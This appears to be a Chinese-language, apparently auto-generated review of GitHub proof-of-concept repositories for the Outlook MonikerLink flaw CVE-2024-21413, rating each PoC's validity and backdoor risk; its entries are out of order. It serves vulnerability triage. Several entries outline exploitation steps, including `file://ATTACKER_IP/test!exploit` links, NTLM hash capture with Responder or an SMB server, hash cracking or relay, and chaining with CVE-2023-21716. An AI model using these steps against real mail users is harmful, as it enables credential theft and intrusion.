根据搜索引擎的结果 (特别是github链接: ThemeHackers/CVE-2024-21413) 和漏洞描述, 此POC是可用的,可以用于漏洞验证的.

**投毒风险分析：**

代码中存在一定的投毒风险，主要体现在以下几个方面：

*   **config.ini文件：** POC依赖于 `config.ini` 文件,需要用户配置邮箱账户和密码。 如果恶意攻击者提供了一个修改后的 `config.ini` 文件，其中包含错误的SMTP配置或恶意代码，可能导致用户的信息泄露或者执行未知的操作。
*   **template/Stripo.html模板：** HTML模板允许插入任意HTML代码，如果攻击者篡改了HTML模板, 就可以嵌入恶意的JavaScript或其他类型的脚本，在用户打开邮件时执行。
*   **依赖的外部库:** colorama, bgtask, configparser， 攻击者可能修改这些依赖，在用户本地执行恶意命令

总体而言，该POC的投毒风险大约为30%。 这个评估是基于对代码的分析以及对潜在攻击向量的理解。需要注意的是，具体的风险程度取决于攻击者的能力和目标用户的安全意识。

**项目地址:** [ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #13

**来源**: [CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md](../2024/CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md)

## CVE-2024-21413-Microsoft-Outlook-RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，无需用户交互即可远程执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise，具体版本请参考CVE详情。

**利用条件:** 攻击者需要通过发送特制的电子邮件给受害者。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2024-21413 漏洞，又名 MonikerLink bug，是一个 Microsoft Outlook 远程代码执行漏洞。攻击者可以通过发送包含恶意链接的电子邮件，在受害者未进行任何交互的情况下执行任意代码。该漏洞的根本原因是 Outlook 在处理 Moniker 链接时存在不当的输入验证。攻击者可以利用此漏洞绕过 Outlook 的安全策略，执行恶意代码。

**有效性：**
从提供的搜索引擎结果和漏洞库信息来看，该漏洞是一个已知的、高危的远程代码执行漏洞，并且有公开的 PoC 代码可用。参考链接 [https://github.com/ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)。因此，提供的 PoC 代码很可能有效。

**投毒风险：**
提供的 PoC 代码包含一个 `exp.sh` 脚本和一个 README.md 文件。
*   `exp.sh` 脚本：该脚本的功能是发送包含恶意链接的电子邮件。其中包含 display_banner函数，send_email函数。`send_email`函数用于发送包含base64编码图片的HTML邮件，邮件内容包含一个URL。从代码本身来看，没有明显的恶意代码或后门，但存在潜在的风险：
    *   该脚本依赖于外部 SMTP 服务器，如果攻击者控制了 SMTP 服务器，可以篡改邮件内容。
    *   base64_image_string 变量中，包含一个PNG图片的Base64编码。攻击者可能会伪造图片内容，嵌入恶意代码，或者使用其他手段达到攻击的目的。
    *   link_url 变量，攻击者可以插入恶意链接，诱导用户点击。
    *   从经验判断，该漏洞的PoC更可能存在于精心构造的link_url, base64_image_string，或者其他的HTML代码片段中，通过某种方式绕过Outlook的安全检查，最终实现RCE，因此存在一定的投毒风险，但直接在exp.sh脚本里投毒的可能性较低。

    考虑到脚本的复杂性，且存在多种潜在的攻击方式，因此认为存在20%的投毒风险。

**利用方式：**
1.  攻击者准备好恶意的`link_url`和`base64_image_string`等变量内容。
2.  攻击者配置`exp.sh` 脚本，指定 SMTP 服务器、端口、用户名、密码、发件人邮箱、收件人邮箱和恶意链接。
3.  攻击者运行 `exp.sh` 脚本，向受害者发送包含恶意链接的电子邮件。
4.  受害者打开电子邮件，Outlook 处理邮件内容时，由于 MonikerLink 漏洞，恶意代码在受害者机器上执行。

综上所述，CVE-2024-21413 是一个高危的远程代码执行漏洞，利用方式简单，但需要精心构造恶意链接和邮件内容才能成功利用，同时要警惕PoC 代码中可能存在的投毒风险。

**项目地址:** [X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit](https://github.com/X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #14

**来源**: [CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，允许攻击者在目标机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021, Microsoft 365 Apps for Enterprise等，具体版本范围参考漏洞库信息。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或内容的邮件。无需用户交互（zero-click NTLM leak）或仅需单次点击（one-click RCE）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为“MonikerLink”漏洞。根据漏洞库信息和搜索结果，此漏洞允许攻击者通过构造特殊的链接，在受害者无需交互或仅需极少交互的情况下，执行任意代码。利用方式主要有两种：

1.  **Zero-click NTLM Leak:** 攻击者可以诱使受害者打开包含恶意链接的邮件，该链接会触发NTLM凭据泄露，而无需受害者进行任何点击操作。
2.  **One-click RCE:** 攻击者可以诱使受害者点击邮件中的恶意链接，从而实现远程代码执行。

POC代码提供了一个Python脚本，该脚本利用SMTP认证发送包含恶意URL的电子邮件，模拟实际攻击场景。脚本需要SMTP服务器地址、端口、用户名、密码、发送者和接收者邮箱地址、恶意URL以及邮件主题等参数。

关于投毒风险，虽然POC代码本身旨在演示漏洞利用，但考虑到网络安全威胁的复杂性，以及攻击者可能对公开代码进行修改和传播，存在一定的投毒风险。例如，攻击者可能在POC代码中添加额外的恶意代码，用于窃取用户凭据或执行其他恶意操作。虽然提供的POC代码看起来比较简单，主要功能是发送包含恶意链接的邮件，但无法完全排除作者或其他人修改该代码并添加后门或恶意功能的可能性。因此，评估投毒风险为10%。使用前务必仔细审查代码，并在隔离环境中进行测试。

**请务必注意：**  该漏洞已在野外被利用，并已被CISA添加到已知被利用的漏洞目录中。强烈建议用户尽快安装Microsoft提供的安全更新。

**项目地址:** [ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #15

**来源**: [CVE-2024-21413-dshabani96_CVE-2024-21413.md](../2024/CVE-2024-21413-dshabani96_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统权限获取

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021等。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或文件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的计算机上执行任意代码，无需用户交互。

**有效性：**根据漏洞信息和搜索结果，此漏洞是一个零日漏洞，已被积极利用。POC 代码旨在利用此漏洞。但是,提供的POC 代码只是发送电子邮件的框架，需要配置 SMTP 服务器，用户名密码等信息，并且需要 SMB 服务器来捕获 NTLM hash，成功利用的可能性取决于环境配置和目标用户行为。

**投毒风险：** 代码主要功能是发送包含恶意链接的电子邮件，并启动 SMB 服务器捕获 NTLM hash。虽然代码包含发送邮件和捕获 NTLM hash的功能，但潜在的风险包括：
1.  **恶意HTML模板：** HTML模板可能包含恶意脚本，例如 JavaScript，如果用户打开邮件并允许执行脚本，可能导致客户端漏洞或信息泄露。
2.  **SMB服务器钓鱼：** 启动的 SMB 服务器可能被用于钓鱼，例如，捕获用户的 NTLM 哈希后尝试破解，或者利用捕获的凭据访问其他服务。
3. **依赖外部服务:** 依赖 SMTP 服务和 SMB 服务, 这些服务本身可能存在安全隐患.
整体投毒风险较低，约为10%，主要集中在HTML模板和配置是否含有恶意代码。

**利用方式：**
1.  攻击者构造包含恶意链接的电子邮件。
2.  受害者打开电子邮件并点击恶意链接。
3.  恶意链接利用 Outlook 的 MonikerLink 漏洞，在受害者计算机上执行任意代码，或者泄露NTLM Hash。
4. 攻击者启动 SMB 服务器，诱导 Outlook 客户端连接，捕获受害者的 NTLM 哈希。
5. 攻击者可以使用捕获的 NTLM 哈希进行进一步攻击，例如传递哈希攻击。

**项目地址:** [dshabani96/CVE-2024-21413](https://github.com/dshabani96/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #16

**来源**: [CVE-2024-21413-duy-31_CVE-2024-21413.md](../2024/CVE-2024-21413-duy-31_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 需要目标用户使用受影响的Outlook版本，并预览或点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过构造包含恶意 `file://` 链接的电子邮件，诱使用户点击或预览该邮件，从而在目标系统上执行任意代码。根据POC代码，攻击者可以使用一个 Expect 脚本发送特制的电子邮件，该邮件包含一个指向远程SMB服务器的 `file://` 链接。当 Outlook 处理此链接时，它会尝试连接到远程服务器，从而泄露用户的 NTLM 哈希值。如果攻击者能够破解哈希值或利用 NTLM 中继攻击，他们就可以获得对系统的访问权限。此外，此漏洞可以与CVE-2023-21716链接以达到远程代码执行的目的。

**有效性：**
提供的POC代码似乎有效，因为它演示了如何利用 `file://` 协议发送包含恶意链接的电子邮件。从漏洞信息和搜索引擎结果来看，该漏洞已经被积极利用。CISA 将其添加到已知被利用的漏洞列表中，表明该漏洞在现实世界中具有很高的威胁。

**投毒风险：**
虽然提供的代码主要目的是演示漏洞利用过程，但存在一些潜在的投毒风险。 Expect脚本本身没有明显的后门,主要利用了telnet发送恶意邮件. 但是，考虑到以下几点，风险评估为10%：
1.  **对外部依赖的信任：** 该脚本依赖于 `expect` 工具，如果该工具被篡改，则可能引入恶意行为。
2.  **脚本执行环境：** 该脚本的执行环境可能存在安全漏洞，攻击者可以利用这些漏洞来执行恶意代码。
3.  **社会工程学：** 攻击者可能会修改脚本以使其更具欺骗性，例如伪造发件人地址或使用更具吸引力的主题行，从而提高攻击成功率。

**利用方式：**
1.  攻击者设置一个 SMB 服务器来监听传入的连接。
2.  攻击者使用提供的 `cve-2024-21413.sh` 脚本生成包含恶意 `file://` 链接的电子邮件。
3.  攻击者将该电子邮件发送给目标用户。
4.  当目标用户在受影响的 Outlook 版本中预览或点击该邮件中的链接时，Outlook 会尝试连接到攻击者的 SMB 服务器。
5.  此连接会导致用户的 NTLM 哈希值被发送到攻击者的服务器。
6.  攻击者可以使用破解工具（如 Hashcat）破解哈希值，或者利用 NTLM 中继攻击来获得对目标系统的访问权限。
7. 攻击者可以将此漏洞与 CVE-2023-21716 结合使用，以实现远程代码执行。


**项目地址:** [duy-31/CVE-2024-21413](https://github.com/duy-31/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #17

**来源**: [CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md](../2024/CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (在指定版本范围内)

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞。根据提供的漏洞利用代码（exploit.py），攻击者通过发送特制的 HTML 邮件，诱骗受害者点击邮件中的 `file://ATTACKER_IP/test!exploit` 链接。此链接利用 MonikerLink 绕过安全警告，从而可能导致任意代码执行。POC 代码本身未发现隐藏的恶意代码，因此投毒风险较低。利用方式是，攻击者需要搭建一个 SMB 服务器，当受害者点击链接时，Outlook 尝试访问该 SMB 服务器上的共享资源，攻击者可以利用这一过程执行恶意代码。漏洞库信息也验证了这是一个高危漏洞，且已经被CISA添加到已知被利用漏洞列表中(KEV)。

**项目地址:** [gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC](https://github.com/gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #18

**来源**: [CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本。具体版本范围请参考漏洞库信息。

**利用条件:** 需要受害者打开包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，利用方式是诱骗用户点击邮件中的`file://`链接。根据提供的漏洞利用代码，攻击者需要设置攻击机IP地址和邮件服务器地址，然后发送包含特定HTML内容的邮件。HTML内容包含一个`file://ATTACKER_MACHINE/test!exploit`链接，当用户点击此链接时，Outlook会尝试访问攻击者机器上的指定路径，如果攻击者在相应路径放置了恶意文件，就可以实现远程代码执行。从代码本身看，没有发现明显的投毒代码。代码的目的是构建包含恶意链接的HTML邮件并发送出去。该漏洞的有效性依赖于目标系统是否受到补丁保护以及攻击者是否能够成功搭建恶意文件服务器。由于CISA已经将此漏洞添加到已知被利用漏洞列表中，并且存在可用的POC，因此利用的有效性较高。攻击者需要控制一个服务器，并在服务器上放置恶意的payload，并通过构造恶意的file://链接诱导用户点击。

**分析：**

1.  **有效性：**根据提供的POC代码和漏洞库信息，该漏洞是有效的。CISA将其添加到已知被利用漏洞列表中，说明该漏洞已被实际利用。提供的POC代码可以用于生成包含恶意链接的电子邮件。
2.  **投毒风险：**经过对POC代码的分析，没有发现明显的投毒代码。代码的功能明确，就是生成并发送包含恶意链接的电子邮件，并没有额外恶意行为。
3.  **利用方式：**
    *   攻击者构建一个包含恶意`file://`链接的HTML邮件。
    *   攻击者将邮件发送给目标用户。
    *   目标用户打开邮件并点击恶意链接。
    *   Outlook尝试访问攻击者控制的服务器上的恶意文件。
    *   如果攻击者在服务器上放置了恶意payload，且Outlook执行该payload，则实现远程代码执行。

**漏洞缓解措施：**

*   及时安装Microsoft官方发布的补丁。
*   谨慎点击邮件中的链接，特别是来自未知发件人的邮件。
*   配置Outlook的安全设置，限制对`file://`协议的使用。


**项目地址:** [hau2212/Moniker-Link-CVE-2024-21413-](https://github.com/hau2212/Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #19

**来源**: [CVE-2024-21413-olebris_CVE-2024-21413.md](../2024/CVE-2024-21413-olebris_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook 远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 aka.ms/OfficeSecurityReleases 中指示的版本).

**利用条件:** 攻击者需要诱使用户打开特制的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一项 Microsoft Outlook 远程代码执行漏洞，也称为“MonikerLink”漏洞。攻击者可以通过发送特制的电子邮件来利用此漏洞，受害者无需进行任何用户交互即可触发。从搜索引擎结果和漏洞库信息来看，该漏洞影响多个版本的Microsoft Outlook。提供的PoC代码是一个Python脚本，用于发送包含恶意链接的电子邮件。脚本构造了一个包含纯文本和HTML部分的电子邮件，其中HTML部分可能包含利用该漏洞的恶意链接。投毒风险评估：代码本身除了常规的邮件发送功能外，在image_base64变量中发现一段疑似图片base64编码的字符串, 但该字符串过长, 不排除其中含有恶意代码的可能性, 因此判断存在一定的投毒风险，概率估计为10%。利用方式：攻击者首先搭建SMTP服务器，然后使用此脚本构造包含恶意URL的电子邮件，并将其发送给目标用户。当目标用户打开电子邮件时，Outlook将尝试加载恶意URL，导致代码执行。

**项目地址:** [olebris/CVE-2024-21413](https://github.com/olebris/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #20

**来源**: [CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md](../2024/CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md)

## CVE-2024-21413 - Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码，可能导致完全控制受影响的系统。

**影响版本:** Microsoft Office 2016版本 < 16.0.5435.1001, Microsoft Office 2019版本 < https://aka.ms/OfficeSecurityReleases, Microsoft 365 Apps for Enterprise版本 < https://aka.ms/OfficeSecurityReleases, Microsoft Office LTSC 2021版本 < https://aka.ms/OfficeSecurityReleases

**利用条件:** 攻击者需要知道受害者的邮箱地址，并能够通过SMTP发送邮件。受害者需要点击邮件中的恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是一个存在于Microsoft Outlook中的零日漏洞。此漏洞允许攻击者通过发送特制的电子邮件在受害者计算机上执行任意代码，而无需任何用户交互。根据描述，利用方式是：攻击者发送包含恶意链接的电子邮件，当用户点击链接时，Outlook会尝试访问链接指向的`file:///` URL，导致执行攻击者控制的代码。提供的POC代码模拟了发送包含恶意链接的电子邮件的过程。该链接指向攻击者控制的SMB共享，当Outlook尝试访问此共享时，受害者的NTLM哈希会被发送到攻击者处。利用此漏洞通常需要用户点击邮件中的链接。关于投毒风险，虽然POC代码本身实现了漏洞利用，但是README中指示要运行`impacket-smbserver` ，并且提供了进一步利用CVE-2023-21716的思路，结合免责声明可以判断，作者主观上没有进行恶意投毒行为，但是客观上如果使用者继续利用可能会进行恶意投毒攻击，因此存在一定的投毒风险，概率约为10%。漏洞库信息和搜索引擎结果均证实了该漏洞的存在和严重性，以及其远程代码执行的性质。

**项目地址:** [r00tb1t/CVE-2024-21413-POC](https://github.com/r00tb1t/CVE-2024-21413-POC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #21

**来源**: [CVE-2024-21413-th3Hellion_CVE-2024-21413.md](../2024/CVE-2024-21413-th3Hellion_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021，直到aka.ms/OfficeSecurityReleases上发布的修复版本。

**利用条件:** 需要受害者打开包含恶意链接的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是 Microsoft Outlook 中的一个远程代码执行漏洞。攻击者可以通过发送特制的电子邮件，诱导受害者点击其中的恶意链接，从而在受害者系统上执行任意代码。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞是真实存在的，并且已经被积极利用。提供的POC代码尝试通过发送包含`file://`协议URL的电子邮件，来触发漏洞。这种方法利用了Outlook处理`file://`链接时的不当输入验证。

**投毒风险分析：**
检查提供的Python脚本和README文件，没有发现明显的恶意代码或后门。脚本的主要功能是构建和发送包含恶意链接的电子邮件。风险主要在于：

*   **脚本可能被修改：**  攻击者可能修改该脚本，例如更改默认的IP地址，添加额外的payload等，用以进行更隐蔽或更具破坏性的攻击。
*   **依赖项风险：**  脚本依赖于`smtplib`库，理论上，该库本身也可能存在潜在的安全问题，但这种可能性较低。
*   **密码泄露风险：** 使用脚本时，发送者的电子邮件密码会以明文形式传递，存在泄露的风险。
*  **接收者打开邮件和点击链接:** 接收者需要打开邮件，并且点击邮件中的链接才会触发，一定程度上限制了利用成功率

因此，将该POC代码本身视为投毒的概率较低，大约为5%。

**利用方式分析：**
1.  **攻击者准备：**
    *   攻击者需要一个SMTP服务器来发送电子邮件。
    *   攻击者需要一个可访问的服务器，并监听特定的端口，以便在受害者点击链接后接收连接。
2.  **漏洞利用：**
    *   攻击者使用POC脚本，指定发送者、接收者、SMTP服务器和攻击者监听的IP地址。
    *   脚本构建包含`file://{args.ip}/` URL的电子邮件，并将其发送给受害者。
3.  **受害者交互：**
    *   受害者打开电子邮件，并点击其中的链接。
    *   Outlook尝试访问`file://{args.ip}/` URL，由于输入验证不足，可能导致执行恶意代码。

总而言之，该漏洞的利用方式依赖于发送包含恶意`file://`链接的电子邮件，并诱导受害者点击该链接。成功利用该漏洞，可以导致远程代码执行。


**项目地址:** [th3Hellion/CVE-2024-21413](https://github.com/th3Hellion/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #22

**来源**: [CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，未经身份验证的攻击者可以通过发送特制的电子邮件，在受害者系统上执行任意代码。

**影响版本:** Microsoft Office 2016 版本低于 16.0.5435.1001；Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 版本低于安全更新版本。

**利用条件:** 需要受害者打开包含恶意链接或内容的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送特制的电子邮件来执行任意代码，而无需用户交互。

**利用方式：**
1.  攻击者构造包含恶意 MonikerLink 的电子邮件。
2.  受害者打开电子邮件。
3.  Outlook 解析恶意 MonikerLink，导致代码执行。

**有效性评估：**
根据漏洞库信息和搜索结果，该漏洞是一个高危漏洞，并且已经存在公开的POC代码。提供的POC代码通过模拟发送包含恶意链接的电子邮件来触发漏洞，因此具有一定的有效性。

**投毒风险评估：**
分析POC代码，代码主要功能是构造并发送包含特定格式链接的邮件，该链接旨在利用Outlook解析链接时的漏洞来执行代码。Base64编码的图像数据是用于伪装邮件内容，降低用户警惕性。代码中未发现明显的恶意行为，如反弹shell、植入后门等。但考虑到攻击者可能修改POC代码以包含恶意负载，存在一定的投毒风险，但风险较低。因此，投毒风险评估为5%。考虑到该代码主要用于验证漏洞，并非完整的攻击链，所以将后门验证代码判定为投毒。


**项目地址:** [xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #23

**来源**: [CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413 - Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise

**利用条件:** 需要受害者点击恶意链接，或者通过其他方式触发Outlook尝试访问攻击者控制的SMB服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，该漏洞源于Outlook处理特定类型的链接时存在缺陷。攻击者可以通过构造包含恶意 Moniker Link (例如 `file://ATTACKER_IP/test!exploit`) 的 HTML 电子邮件，诱使用户点击该链接。当受害者点击该链接时，Outlook会尝试通过 SMB 协议连接到攻击者指定的服务器。攻击者可以使用 Responder 等工具监听 SMB 连接，并捕获受害者的 NTLMv2 哈希。虽然此PoC的直接目的是捕获NetNTLMv2 哈希，但这只是攻击链的一部分。在某些配置下，捕获的哈希可以被破解或重放，以获得对受害者系统的进一步访问。根据 Checkpoint 的研究，该漏洞利用了 `MkParseDisplayName()` API。PoC代码提供了一个可行的攻击方法，但需要进行一些配置，例如替换`ATTACKER_IP`和设置正确的邮件服务器信息。投毒风险评估为10%，主要是因为该PoC代码需要受害者交互（点击链接），并且依赖于Responder等工具来捕获哈希，这本身并不属于漏洞利用，但是不排除攻击者在其他地方插入恶意代码的可能性。漏洞库信息中提到CWE-20: Improper Input Validation，也说明了该漏洞是由于输入验证不当引起的。利用方式总结如下：

1.  攻击者构造包含恶意 Moniker Link 的 HTML 电子邮件。
2.  攻击者发送电子邮件给受害者。
3.  受害者点击电子邮件中的恶意链接。
4.  Outlook 尝试通过 SMB 协议连接到攻击者控制的服务器。
5.  攻击者使用 Responder 等工具捕获受害者的 NTLMv2 哈希。
6.  攻击者破解或重放 NTLMv2 哈希以获得对受害者系统的进一步访问（可选）。

**项目地址:** [yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-](https://github.com/yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---



---

## POC #8

**来源**: [CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露（NTLM凭据）

**影响版本:** 受影响版本：Microsoft Office 2016 (小于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (具体版本范围请参考漏洞库信息)

**利用条件:** 用户需要打开包含恶意链接的邮件，无需用户交互（根据搜索结果和漏洞描述）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的机器上执行任意代码，而无需任何用户交互。利用方式是诱使用户打开包含特制的 `file://` 链接的电子邮件。该链接指向一个恶意共享位置，当 Outlook 尝试访问此链接时，可能会触发远程代码执行。提供的 POC 代码通过 `smtplib` 库创建一个电子邮件客户端，然后构造一个包含 `file://` 链接的 HTML 邮件。用户可以自定义发件人、收件人、主题，以及是否添加包含恶意链接的附件。虽然该POC的主要功能是发送包含恶意链接的邮件，但仍然存在一定的投毒风险。例如，攻击者可能在脚本中添加额外的代码，例如收集用户输入的邮箱密码等，因此投毒风险评估为10%。从搜索结果来看，此漏洞已被积极利用，CISA 已将其添加到已知被利用的漏洞列表中。

